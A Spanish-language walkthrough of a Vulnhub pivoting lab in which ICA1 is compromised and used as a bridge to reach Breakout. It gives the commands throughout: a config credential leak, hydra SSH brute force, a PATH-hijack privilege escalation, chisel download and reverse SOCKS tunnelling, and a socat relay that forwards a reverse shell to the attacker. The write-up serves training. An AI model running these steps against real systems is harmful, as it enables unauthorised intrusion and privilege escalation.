---
title: Laboratorio - Pivoting
author: cotes
date: 2023-07-24 17:51:00 +0800
categories: [Laboratorio, Pivoting]
tags: [Pivoting]
math: true
mermaid: true
image:
  path: /assets/images/Laboratorios/pivoting/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Pivoting Logo
---

Laboratorio de Pivoting con 2 Máquinas de Vulnhub (**ICA1** y **Breakout**), la máquina objetivo será 'Breakout' la cual está conectada en una subred con la máquina ICA1, la cual usaremos de puente para llegar a la máquina objetivo.

![](/assets/images/Laboratorios/pivoting/laboratory.png)

---

## **Vulnerando la Máquina ICA1** 🐱‍👤


a. Identificamos la dirección IP de la **Máquina ICA1** con **arp-scan**

![](/assets/images/Laboratorios/pivoting/01-arp.png)


b. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

  ![](/assets/images/Laboratorios/pivoting/02-ports-ica.png)

c. Vemos las versiones de los servicios que se están ejecutando en los puertos.

* **`nmap -sCV -p<Ports>  <IP> -oN versiones`**

  ![](/assets/images/Laboratorios/pivoting/03-versions-ica.png)

d. Al buscar con searchsploit alguna vulnerabilidad para el servicio qdPM vemos que podemos leer la contraseña de este servicio si visitamos la ruta **http://<website>/core/config/databases.yml**

* databases.yml

    ```yml
    username: qdpmadmin
        password: "<?php echo urlencode('UcVQCMQk2STVeS6J') ; ?>"
    ```

* Con estas credenciales nos autenticamos en el servicio mysql

    ```bash
    root@kali>  mysql -h 192.168.100.27 -u qdpmadmin -p'UcVQCMQk2STVeS6J'
    MySQL [(none)]>
    ```

* Las credenciales las podemos ver usando la base de datos **staff** y con la siguiente sentencia SQL

    ```sql
    MySQL [(none)]> use staff;
    MySQL [staff]> select u.name, l.password from login as l JOIN user as u ON u.id=l.user_id;

    +--------+--------------------------+
    | name   | password                 |
    +--------+--------------------------+
    | Smith  | WDdNUWtQM1cyOWZld0hkQw== |
    | Lucas  | c3VSSkFkR3dMcDhkeTNyRg== |
    | Travis | REpjZVZ5OThXMjhZN3dMZw== |
    | Dexter | N1p3VjRxdGc0MmNtVVhHWA== |
    | Meyer  | Y3FObkJXQ0J5UzJEdUpTeQ== |
    +--------+--------------------------+
    ```

* Todas las credenciales están en base64, así que las decodeamos

    ```bash
    root@kali> cat sql | awk '{print $4}' | while read line; do echo "$line" | base64 -d;echo; done

    X7MQkP3W29fewHdC
    suRJAdGwLp8dy3rF
    DJceVy98W28Y7wLg
    7ZwV4qtg42cmUXGX
    cqNnBWCByS2DuJSy
    ```

e. Guardamos los usuarios y las contraseñas en archivos y usaremos hydra para probar con todas las credenciales

```bash
root@kali> hydra -L users.txt -P passwords.txt ssh://192.168.100.27
[22][ssh] host: 192.168.100.27   login: travis   password: DJceVy98W28Y7wLg

root@kali> sshpass -p 'DJceVy98W28Y7wLg' ssh travis@192.168.100.27
travis@debian:~$
```

### Escalada de Privilegios 💹

a. Vemos que existe el usuario **dexter** del cual tenemos la contraseña, por lo que nos transformamos en este usuario

```bash
travis@debian:/home$ su dexter
Password: 7ZwV4qtg42cmUXGX
```

* En el directorio de este usuario tenemos la siguiente nota

    ```bash
    dexter@debian:/home/dexter$ cat note.txt
    It seems to me that there is a weakness while accessing the system.
    As far as I know, the contents of executable files are partially viewable.
    I need to find out if there is a vulnerability or not.
    ```
    > Aquí nos dicen que no se sabe si ver parcialmente el código de ejecutables sea un riesgo.

* Consultamos por binarios SUID en el sistema

    ```bash
    dexter@debian:/home/dexter$ find / -perm -4000 2>/dev/null                                                
    /opt/get_access
    <SNIP>
    ```

* Listamos las cadenas legibles de este binario

    ```bash
    dexter@debian:/home/dexter$ strings /opt/get_access
    <SNIP>
    cat /root/system.info
    <SNIP>
    ```
    > **cat** se llama de manera relativa por lo que es vulnerable a un Path Hijacking

b. Creamos un fichero con el nombre de **cat** el cual contenga `chmod +s /bin/bash` y le damos permisos de ejecución, alteramos nuestro **PATH** para que se tome como prioridad la ruta **`/tmp`**

```bash
dexter@debian:/tmp$ echo -n 'chmod +s /bin/bash' > cat
dexter@debian:/tmp$ chmod +x cat
dexter@debian:/tmp$ export PATH=/tmp:$PATH
dexter@debian:/tmp$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

* Ahora ejecutamos de nuevo el binario SUID y veremos que se cambiaron los permisos de la **bash**

    ```bash
    dexter@debian:/tmp$ /opt/get_access
    dexter@debian:/tmp$ ls -la /bin/bash
    -rwsr-sr-x 1 root root 1234376 Aug  4  2021 /bin/bash
    ```

c. Por últimos nos convertimos en root con `bash -p`

```bash
dexter@debian:/home/dexter$ bash -p
bash-5.1# whoami
root
```

## **Vulnerando la Máquina Breakout** 🤖

a. Vemos las interfaces de red en la **Máquina ICA1**

```bash
bash-5.1# hostname -I
10.0.2.5 192.168.100.27
```
> Tenemos una segunda interfaz de red en el segmento **10.0.2.0/24**

b. Escaneamos por hosts activos en esta subred con un script en bash

* **hosts.sh**

    ```bash
    #!/bin/bash

    greenColour="\e[0;32m\033[1m"
    endColour="\033[0m\e[0m"
    blueColour="\e[0;34m\033[1m"

    for host in $(seq 1 255);do
        timeout 1 bash -c "ping -c 1 10.0.2.$host" &>/dev/null && echo -e "${greenColour}[+] Host Activo:${endColour} ${blueColour}10.0.2.$host${endColour}" &
    done; wait
    ```

    ```bash
    bash-5.1# ./hosts.sh 
    [+] Host Activo: 10.0.2.5 (ICA1)
    [+] Host Activo: 10.0.2.4 (Breakout)
    [+] Host Activo: 10.0.2.1
    ```

c. Para escanear el host **`10.0.2.4`** fácilmente usaremos [chisel](https://github.com/jpillora/chisel/releases/tag/v1.9.0)

* Nos decargamos chisel en nuestra máquina y lo subimos a la **ICA1**

    ```bash
    root@kali> python -m http.server 8080
    ----------------------------------------------------
    bash-5.1# wget http://<IP Atacante>:8080/chisel -o-
    ```

    ```bash
    root@kali> ./chisel server --reverse -p 4444
    -----------------------------------------------------
    bash-5.1# ./chisel client <IP Atacante>:4444 R:socks
    ```

* Con esto tendremos una conexión de tipo **socks5** la cual deberemos añadir al archivo **/etc/proxychains4.conf**

    ```bash
    root@kali> cat /etc/proxychains4.conf
    <SNIP>
    # Quiet mode (no output from library)
    quiet_mode
    <SNIP>
    socks5  127.0.0.1 1080
    ```

d. Ahora, ya podemos acceder a la **Máquina Breakout** para analizarla.

a. Enumeramos los puertos que están abiertos.

* **`proxychains nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/Vulnhub/Easy/Breakout/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos 21,80

* **`proxychains nmap -p<Ports>  <IP> -oN versiones`**

    ![](/assets/images/Vulnhub/Easy/Breakout/02-versions.png)


c. Para acceder al servicio web de **Breakout** usaremos FoxyProxy

![](/assets/images/Laboratorios/pivoting/04-foxyproxy.png)


d. Al fijarnos en el código fuente de la página web (**http://10.0.2.4**), encontramos una credencial escrita en brainfuck

```brainfuck
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.
```

* Lo decodeamos en [dcode](https://www.dcode.fr/brainfuck-language) y la veremos en texto claro **.2uqPEfj3D<P'a-3**

e. Enumeramos un usuario válido con rpcclient

```bash
root@kali> cat /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt | xargs -P 10 -I {} proxychains rpcclient -N -U "" 10.0.2.4 -c "lookupnames {}" 2>&1 | grep -vE "NT_STATUS_NONE_MAPPED|proxychains"

<SNIP>
cyber S-1-22-1-1000 (User: 1)
<SNIP>
```

* Con esto ya tenemos credenciales `cyber:.2uqPEfj3D<P'a-3`.
* Tenemos 2 paneles **https://10.0.2.4:20000/ (Usermin)** y **https://10.0.2.4:10000/ (Webmin)**

f. Al momento de acceder a estos servicios se quedarán cargando y no podremos acceder, por lo que realizaremos **`Local Port Forwarding`** con **SSH** para acceder a un puerto a la vez

```bash
root@kali> sshpass -p 'DJceVy98W28Y7wLg' ssh -L 20000:10.0.2.4:20000 travis@192.168.100.27
```

* **`20000:10.0.2.4:20000`:** Decimos que el puerto **20000** de nuestra **`Máquina Atacante`** sea ocupado por el servicio que se ejecuta en el puerto **20000** de la **`Máquina Breakout`** 

    ```bash
    root@kali> lsof -i:20000
    COMMAND    PID USER  FD  TYPE DEVICE SIZE/OFF NODE NAME
    ssh     167141 root  4u  IPv6 929073  0t0  TCP localhost:20000 (LISTEN)
    ssh     167141 root  5u  IPv4 929074  0t0  TCP localhost:20000 (LISTEN)
    ```
    > Verificamos si el **`Local Port Forwarding`** funcionó.

e. Ahora podemos auntenticarnos en el servicio **Usermin** sin necesidad de un proxy https://127.0.0.1:20000/, una vez autenticados, presionamos **`Alt` + `K`** para desplegar una consola.

* Nos enviaremos una **reverse shell** a nuestra Máquina Atacante, pero, usaremos [socat](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat) para utilizar la **Máquina ICA1** como puente

* Subimos socat a la Máquina ICA1 y establecemos una regla para que toda conexión entrante por un puerto sea redirigido a otro host por un puerto dado

    ```bash
    bash-5.1# ./socat TCP-LISTEN:4444,fork TCP:<IP Atacante>:443
    ```
    > Toda conexión recibida por el puerto **`4444`** será redigirida a nuestra máquina atacante por el puerto **`443`**

* Nos ponemos en escucha con nc en nuestra Máquina Atacante, y enviamos la shell desde la terminal del servicio web al host **ICA1 (10.0.2.5)**

![](/assets/images/Laboratorios/pivoting/05-flaw.png)

f. Investigamos formas de escalar privilegios y encontramos un binario **`tar`** en nuestro directorio de usuario y un fichero **.old_pass.bak** 

```bash
cyber@breakout:~$ ls -la
-rwxr-xr-x  1 root  root  531928 Oct 19  2021 tar

cyber@breakout:/var/backups$ ls -la
-rw-------  1 root root    17 Oct 20  2021 .old_pass.bak
```

* Vemos que el dueño del binario tar es root y cualquier otro usuario lo puede ejecutar, por lo que usaremos este binario en específico para comprimir el fichero **.old_pass.bak**

    ```bash
    cyber@breakout:/var/backups$ /home/cyber/tar -czvf /tmp/old_pass.tar.gz .old_pass.bak
    cyber@breakout:/tmp$ /home/cyber/tar -xzvf old_pass.tar.gz
    cyber@breakout:/tmp$ cat .old_pass.bak 
    Ts&4&YurgtRX(=~h
    ```

g. Esta contraseña es del usuario **root** por lo que hemos culminado el laboratorio de **`Pivoting 1`** 🐱‍🐉

```bash
cyber@breakout:/tmp$ su root
Password: Ts&4&YurgtRX(=~h
root@breakout:~# cat rOOt.txt 
3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}

Author: Icex64 & Empire Cybersecurity
```